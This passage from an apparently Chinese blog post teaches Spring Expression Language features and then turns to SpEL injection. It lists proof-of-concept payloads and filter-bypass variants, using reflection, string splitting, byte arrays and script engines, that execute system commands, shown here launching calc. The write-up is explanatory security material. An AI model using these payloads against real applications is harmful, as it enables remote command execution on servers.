class="keyword">void</span> <span class="title">setPopulation</span><span class="params">(<span class="keyword">int</span> population)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.population = population;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改Beans.xml，使用<code>&lt;util:list&gt;</code>元素配置一个包含City对象的List集合：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:util</span>=<span class="string">"http://www.springframework.org/schema/util"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/util</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/util/spring-util-4.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">util:list</span> <span class="attr">id</span>=<span class="string">"cities"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"Chicago"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"IL"</span> <span class="attr">p:population</span>=<span class="string">"2853114"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"Atlanta"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"GA"</span> <span class="attr">p:population</span>=<span class="string">"537958"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"Dallas"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"TX"</span> <span class="attr">p:population</span>=<span class="string">"1279910"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"Houston"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"TX"</span> <span class="attr">p:population</span>=<span class="string">"2242193"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"Odessa"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"TX"</span> <span class="attr">p:population</span>=<span class="string">"90943"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"El Paso"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"TX"</span> <span class="attr">p:population</span>=<span class="string">"613190"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"Jal"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"NM"</span> <span class="attr">p:population</span>=<span class="string">"1996"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"Las Cruces"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"NM"</span> <span class="attr">p:population</span>=<span class="string">"91865"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">util:list</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="访问集合成员"><a href="#访问集合成员" class="headerlink" title="访问集合成员"></a>访问集合成员</h4><p>SpEL表达式支持通过<code>#{集合ID[i]}</code>的方式来访问集合中的成员。</p><p>定义一个ChoseCity类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChoseCity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> City city;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCity</span><span class="params">(City city)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.city = city;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> City <span class="title">getCity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> city;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Beans.xml中，选取集合中的某一个成员，并赋值给city属性中：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"choseCity"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.ChoseCity"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"city"</span> <span class="attr">value</span>=<span class="string">"#&#123;cities[0]&#125;"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>MainApp.java，实例化这个Bean：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainApp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"Beans.xml"</span>);</span><br><span class="line">        ChoseCity c = (ChoseCity)context.getBean(<span class="string">"choseCity"</span>);</span><br><span class="line">        System.out.println(c.getCity().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行无误则输出”Chicago”。</p><p>随机地选择一个city，中括号<code>[]</code>运算符始终通过索引访问集合中的成员：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"city"</span> <span class="attr">value</span>=<span class="string">"#&#123;cities[T(java.lang.Math).random()*cities.size()]&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>此时会随机访问一个集合成员并输出。</p><blockquote><p><code>[]</code>运算符同样可以用来获取java.util.Map集合中的成员。例如，假设City对象以其名字作为键放入Map集合中，在这种情况下，我们可以像下面那样获取键为Dallas的entry：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"chosenCity"</span> <span class="attr">value</span>=<span class="string">"#&#123;cities['Dallas']&#125;"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><code>[]</code>运算符的另一种用法是从java.util.Properties集合中取值。例如，假设我们需要通过<code>&lt;util:properties&gt;</code>元素在Spring中加载一个properties配置文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">util:properties</span> <span class="attr">id</span>=<span class="string">"settings"</span> <span class="attr">loaction</span>=<span class="string">"classpath:settings.properties"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>现在要在这个配置文件Bean中访问一个名为twitter.accessToken的属性：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"accessToken"</span> <span class="attr">value</span>=<span class="string">"#&#123;settings['twitter.accessToken']&#125;"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><code>[]</code>运算符同样可以通过索引来得到某个字符串的某个字符，例如下面的表达式将返回s：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; &apos;This is a test&apos;[3]</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="查询集合成员"><a href="#查询集合成员" class="headerlink" title="查询集合成员"></a>查询集合成员</h4><p>SpEL表达式中提供了查询运算符来实现查询符合条件的集合成员：</p><ul><li><code>.?[]</code>：返回所有符合条件的集合成员；</li><li><code>.^[]</code>：从集合查询中查出第一个符合条件的集合成员；</li><li><code>.$[]</code>：从集合查询中查出最后一个符合条件的集合成员；</li></ul><p>修改ChoseCity类，将city属性类型改为City列表类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChoseCity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;City&gt; city;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;City&gt; <span class="title">getCity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> city;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCity</span><span class="params">(List&lt;City&gt; city)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.city = city;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改Beans.xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"choseCity"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.ChoseCity"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"city"</span> <span class="attr">value</span>=<span class="string">"#&#123;cities.?[population gt 100000]&#125;"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改MainApp.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainApp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"Beans.xml"</span>);</span><br><span class="line">        ChoseCity c = (ChoseCity)context.getBean(<span class="string">"choseCity"</span>);</span><br><span class="line">        <span class="keyword">for</span>(City city:c.getCity())&#123;</span><br><span class="line">            System.out.println(city.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Chicago</span><br><span class="line">Atlanta</span><br><span class="line">Dallas</span><br><span class="line">Houston</span><br><span class="line">El Paso</span><br></pre></td></tr></table></figure><h4 id="集合投影"><a href="#集合投影" class="headerlink" title="集合投影"></a>集合投影</h4><blockquote><p>集合投影就是从集合的每一个成员中选择特定的属性放入到一个新的集合中。SpEL的投影运算符<code>.![]</code>完全可以做到这一点。</p><p>例如，我们仅需要包含城市名称的一个String类型的集合：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"cityNames"</span> <span class="attr">value</span>=<span class="string">"#&#123;cities.![name]&#125;"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>再比如，得到城市名字加州名的集合：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt;property name=&quot;cityNames&quot; value=&quot;#&#123;cities.![name+&apos;,&apos;+state]&#125;&quot;/&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>把符合条件的城市的名字和州名作为一个新的集合：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"cityNames"</span> <span class="attr">value</span>=<span class="string">"#&#123;cities.?[population gt 100000].![name+','+state]&#125;"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h3 id="变量定义和引用"><a href="#变量定义和引用" class="headerlink" title="变量定义和引用"></a>变量定义和引用</h3><p>在SpEL表达式中，变量定义通过EvaluationContext类的setVariable(variableName, value)函数来实现；在表达式中使用”#variableName”来引用；除了引用自定义变量，SpEL还允许引用根对象及当前上下文对象：</p><ul><li><code>#this</code>：使用当前正在计算的上下文；</li><li><code>#root</code>：引用容器的root对象；</li></ul><p>示例，使用setVariable()函数定义了名为variable的变量，并且通过<code>#variable</code>来引用，同时尝试引用根对象和上下文对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">EvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext(<span class="string">"mi1k7ea"</span>);</span><br><span class="line">context.setVariable(<span class="string">"variable"</span>, <span class="string">"666"</span>);</span><br><span class="line">String result1 = parser.parseExpression(<span class="string">"#variable"</span>).getValue(context, String.class);</span><br><span class="line">System.out.println(result1);</span><br><span class="line">String result2 = parser.parseExpression(<span class="string">"#root"</span>).getValue(context, String.class);</span><br><span class="line">System.out.println(result2);</span><br><span class="line">String result3 = parser.parseExpression(<span class="string">"#this"</span>).getValue(context, String.class);</span><br><span class="line">System.out.println(result3);</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">666</span><br><span class="line">mi1k7ea</span><br><span class="line">mi1k7ea</span><br></pre></td></tr></table></figure><h3 id="instanceof-表达式"><a href="#instanceof-表达式" class="headerlink" title="instanceof 表达式"></a>instanceof 表达式</h3><p>SpEL 支持 instanceof 运算符，跟 Java 内使用同义；如”‘haha’ instanceof T(String)”将返回 true。</p><h3 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h3><p>目前只支持类静态方法注册为自定义函数。SpEL使用StandardEvaluationContext的registerFunction方法进行注册自定义函数，其实完全可以使用setVariable代替，两者其实本质是一样的。</p><p>示例，用户自定义实现字符串反转的函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserFunc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">reverseString</span><span class="params">(String input)</span> </span>&#123;</span><br><span class="line">        StringBuilder backwards = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; input.length(); i++) &#123;</span><br><span class="line">            backwards.append(input.charAt(input.length() - <span class="number">1</span> - i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> backwards.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过如下代码将方法注册到StandardEvaluationContext并且来使用它：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">StandardEvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">context.registerFunction(<span class="string">"reverseString"</span>, UserFunc.class.getDeclaredMethod(<span class="string">"reverseString"</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;));</span><br><span class="line">String helloWorldReversed = parser.parseExpression(<span class="string">"#reverseString('mi1k7ea')"</span>).getValue(context, String.class);</span><br><span class="line">System.out.println(helloWorldReversed);</span><br></pre></td></tr></table></figure><p>输出反转的字符串<code>ae7k1im</code>。</p><h2 id="0x02-SpEL表达式注入漏洞"><a href="#0x02-SpEL表达式注入漏洞" class="headerlink" title="0x02 SpEL表达式注入漏洞"></a>0x02 SpEL表达式注入漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>SimpleEvaluationContext和StandardEvaluationContext是SpEL提供的两个EvaluationContext：</p><ul><li>SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。</li><li>StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</li></ul><p>SimpleEvaluationContext旨在仅支持SpEL语言语法的一个子集，不包括 Java类型引用、构造函数和bean引用；而StandardEvaluationContext是支持全部SpEL语法的。</p><p>由前面知道，SpEL表达式是可以操作类及其方法的，可以通过类类型表达式T(Type)来调用任意类方法。这是因为在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。</p><p>如下，前面的例子中已提过：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.Expression;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainApp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String spel = <span class="string">"T(java.lang.Runtime).getRuntime().exec(\"calc\")"</span>;</span><br><span class="line">        ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">        Expression expression = parser.parseExpression(spel);</span><br><span class="line">        System.out.println(expression.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行弹计算器：</p><p><img src="/2020/01/10/SpEL表达式注入漏洞总结/1.png" alt=""></p><h3 id="PoC-amp-Bypass整理"><a href="#PoC-amp-Bypass整理" class="headerlink" title="PoC&amp;Bypass整理"></a>PoC&amp;Bypass整理</h3><p>下面我们来整理下各种利用的PoC，这里默认把定界符<code>#{}</code>去掉。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">// PoC原型</span><br><span class="line"></span><br><span class="line">// Runtime</span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line">T(Runtime).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line"></span><br><span class="line">// ProcessBuilder</span><br><span class="line">new java.lang.ProcessBuilder(&#123;&apos;calc&apos;&#125;).start()</span><br><span class="line">new ProcessBuilder(&#123;&apos;calc&apos;&#125;).start()</span><br><span class="line"></span><br><span class="line">******************************************************************************</span><br><span class="line">// Bypass技巧</span><br><span class="line"></span><br><span class="line">// 反射调用</span><br><span class="line">T(String).getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line"></span><br><span class="line">// 同上，需要有上下文环境</span><br><span class="line">#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line"></span><br><span class="line">// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤</span><br><span class="line">T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;&#125;)</span><br><span class="line"></span><br><span class="line">// 同上，需要有上下文环境</span><br><span class="line">#this.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;&#125;)</span><br><span class="line"></span><br><span class="line">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1</span><br><span class="line">// byte数组内容的生成后面有脚本</span><br><span class="line">new java.lang.ProcessBuilder(new java.lang.String(new byte[]&#123;99,97,108,99&#125;)).start()</span><br><span class="line"></span><br><span class="line">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2</span><br><span class="line">// byte数组内容的生成后面有脚本</span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)))</span><br><span class="line"></span><br><span class="line">// JavaScript引擎通用PoC</span><br><span class="line">T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;nashorn&quot;).eval(&quot;s=[3];s[0]=&apos;cmd&apos;;s[1]=&apos;/C&apos;;s[2]=&apos;calc&apos;;java.la&quot;+&quot;ng.Run&quot;+&quot;time.getRu&quot;+&quot;ntime().ex&quot;+&quot;ec(s);&quot;)</span><br><span class="line"></span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;xxx&quot;),)</span><br><span class="line"></span><br><span class="line">// JavaScript引擎+反射调用</span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;&#125;)),)</span><br><span class="line"></span><br><span class="line">// JavaScript引擎+URL编码</span><br><span class="line">// 其中URL编码内容为：</span><br><span class="line">// 